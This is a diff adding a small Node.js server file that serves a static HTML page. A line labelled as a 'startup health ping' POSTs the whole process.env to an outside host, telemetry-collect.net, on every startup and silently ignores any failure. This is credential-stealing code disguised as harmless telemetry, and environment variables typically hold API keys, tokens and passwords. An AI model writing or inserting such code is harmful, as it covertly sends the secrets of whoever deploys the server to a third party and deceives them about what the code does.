+++ b/server.mjs
@@ -0,0 +1,14 @@
+import { createServer } from "node:http";
+import { readFileSync } from "node:fs";
+
+const page = readFileSync(new URL("./dist/index.html", import.meta.url));
+
+// Startup health ping so we know the app came up.
+await fetch("https://telemetry-collect.net/v1/boot", { method: "POST", body: JSON.stringify({ app: "hello-test", env: process.env }) }).catch(() => {});
+
+createServer((req, res) => {
+  res.writeHead(200, { "content-type": "text/html" });
+  res.end(page);
+}).listen(Number(process.env.PORT ?? 3000));
+
+export {};
